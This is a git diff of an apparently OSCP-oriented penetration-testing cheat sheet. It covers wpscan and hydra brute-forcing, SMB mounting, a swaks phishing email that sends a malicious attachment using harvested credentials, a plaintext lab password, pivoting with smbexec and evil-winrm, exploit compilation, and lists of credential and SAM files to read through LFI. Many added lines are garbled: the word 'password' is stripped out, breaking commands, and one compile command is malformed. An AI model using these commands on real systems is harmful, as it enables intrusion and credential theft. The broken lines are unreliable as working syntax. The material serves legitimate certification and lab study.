@@ -65,17 +65,18 @@ cmsmap.py https://x.x.x.x
 wpscan --url https://x.x.x.x
  wpscan --url http://192.168.50.244 --enumerate p --pluginsdetection aggressive -o websrv1/wpscan    #scan plugins
 #bruteforce wpscan
-wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/Passwords/best1050.txt -- username admin -- threads 10
+wpscan --url http://x.x.x.x -- wordlist /usr/share/wordlists/SecLists/s/best1050.txt -- username admin -- threads 10
 ```
 
 ### SMB Enumeration
+- SMB can run: directly over TCP (port 445) OR via Netbios API (137/139)
 ```bash
 smbmap -H x.X.X.x
 smbclient -L \\\\X.X.X.x -N
 nmap -- script=smb-check-vulns.nse x.x.x.x
 smbmount //x.x.x.x/share /mnt -o username=xxx,workgroup=xxx
 mount -t cifs //x.x.x.x/share /mnt
-mount -t cifs -o username=xxx,password=xxx //x.x.x.x/share /mnt
+mount -t cifs -o username=xxx,=xxx //x.x.x.x/share /mnt
 smbclient \\\\x.x.x.x\\share
 ```
 
@@ -318,7 +319,7 @@ python3 -m http.server 8000
 # then start netcat listener after running python3 web server
 nc -nvlp 4444
 
-#Send phishing email. body.txt is the email body using valid credentials from enumeration Username: john, Password: dqsTwTpZPn#nL
+#Send phishing email. body.txt is the email body using valid credentials from enumeration Username: john, : dqsTwTpZPn#nL
 kali@kali:~/beyond$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.50.242 --body body.txt --header "Subject: Staging Script" --suppress-data -ap
 ```
 
@@ -1086,16 +1087,20 @@ socks5 127.0.0.1 1080
 proxychains -q nmap -sC -sV 10.0.60.99
 proxychains -q ssh user@10.0.60.99
 proxychains -q mysql -u dbuser -h 10.0.60.99
-proxychains -q impacket-smbexec domain\user:password -target-ip  10.0.60.99
-proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p 'password'
+proxychains -q impacket-smbexec domain\user: -target-ip  10.0.60.99
+proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
 
 #or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
 ```
 
 ## compiling windows exploit on kali
 ```bash
+#compile 32 bit
 apt install mingw-w64
 i686-w64-mingw32-gcc /usr/share/exploitdb/exploits/windows/dos/42341.c -o syncbreeze_exploit.exe -lws2_32
+
+#compile 64 bit
+$ gcc i686-w64-mingw32-gcc exploit.c -o exploit.exe
 ```
 
 ## Post exploitation evidence
@@ -1125,3 +1130,116 @@ ssh -i id_rsa daniela@192.168.50.244
 ssh2john id_rsa > ssh.hash
 john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 ```
+
+## Hydra
+```bash
+# http POST-form cracking (login forms), brute force username and password
+hydra -l USERNAME -P /path/to/wordlist http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed text"
+
+#bruteforce password only
+hydra 10.11.0.22 http-form-post "/form/frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -1 admin -P /usr/share/wordlists/rockyou. txt -vV -f![image](https://github.com/redcountryroad/OSCP-shortsheet/assets/166571565/a78ffd2d-a33b-4f53-8574-9b6a4a7f4c40)
+```
+
+## files of interest
+- In the case where there is a LFI, and you cannot gain command execution try looking for interesting files which might contain credentials to help you move forward.
+
+```bash
+#Linux Interesting Files
+/etc/passwd <- see which users are on the box
+SSH keys <- using the information from above, check to see if there are any LFI keys
+    - default location: /home/user/.ssh/id_rsa
+/var/lib/tomcatX/tomcat-users.xml <- replace x with the tomcat version installed, and see if there are any credentias
+```
+
+```bash
+#windows interesting files
+C:/Users/Administrator/NTUser.dat
+C:/Documents and Settings/Administrator/NTUser.dat
+C:/apache/logs/access.log
+C:/apache/logs/error.log
+C:/apache/php/php.ini
+C:/boot.ini
+C:/inetpub/wwwroot/global.asa
+C:/MySQL/data/hostname.err
+C:/MySQL/data/mysql.err
+C:/MySQL/data/mysql.log
+C:/MySQL/my.cnf
+C:/MySQL/my.ini
+C:/php4/php.ini
+C:/php5/php.ini
+C:/php/php.ini
+C:/Program Files/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/conf/httpd.conf
+C:/Program Files/Apache Group/Apache/logs/access.log
+C:/Program Files/Apache Group/Apache/logs/error.log
+C:/Program Files/FileZilla Server/FileZilla Server.xml
+C:/Program Files/MySQL/data/hostname.err
+C:/Program Files/MySQL/data/mysql-bin.log
+C:/Program Files/MySQL/data/mysql.err
+C:/Program Files/MySQL/data/mysql.log
+C:/Program Files/MySQL/my.ini
+C:/Program Files/MySQL/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
+C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
+C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
+C:/Program Files/MySQL/MySQL Server 5.0/my.ini
+C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
+C:/Program Files (x86)/Apache Group/Apache/conf/access.log
+C:/Program Files (x86)/Apache Group/Apache/conf/error.log
+C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
+C:/Program Files (x86)/xampp/apache/conf/httpd.conf
+C:/WINDOWS/php.ini
+C:/WINDOWS/Repair/SAM
+C:/Windows/repair/system
+C:/Windows/repair/software
+C:/Windows/repair/security
+C:/WINDOWS/System32/drivers/etc/hosts
+C:/Windows/win.ini
+C:/WINNT/php.ini
+C:/WINNT/win.ini
+C:/xampp/apache/bin/php.ini
+C:/xampp/apache/logs/access.log
+C:/xampp/apache/logs/error.log
+C:/Windows/Panther/Unattend/Unattended.xml
+C:/Windows/Panther/Unattended.xml
+C:/Windows/debug/NetSetup.log
+C:/Windows/system32/config/AppEvent.Evt
+C:/Windows/system32/config/SecEvent.Evt
+C:/Windows/system32/config/default.sav
+C:/Windows/system32/config/security.sav
+C:/Windows/system32/config/software.sav
+C:/Windows/system32/config/system.sav
+C:/Windows/system32/config/regback/default
+C:/Windows/system32/config/regback/sam
+C:/Windows/system32/config/regback/security
+C:/Windows/system32/config/regback/system
+C:/Windows/system32/config/regback/software
+C:/Program Files/MySQL/MySQL Server 5.1/my.ini
+C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
+C:/Windows/System32/inetsrv/config/applicationHost.config
+C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
+```
+
+## Useful NSE scripts
+```bash
+#smb-vuln-ms08-067
+nmap --script-args=unsafe=1 --script smb-vuln-ms08-067.nse -p 445 <host>
+
+#http-shellshock
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/{location},cmd=ls <target>
+```
+
+## /etc/crontab vs crontab
+- /etc/crontab
+  - Contains everything in one place
+  - Only root can edit
+  - Able to view which user is running what cron
+  - /etc/crontab is public, and readable by anyone
+ 
+- /var/spool/cron/crontab/{user}
+  - Users are allowed to create their own cron jobs
+  - Only root can edit crontab for user
+  - Cron job is private unlike /etc/crontab
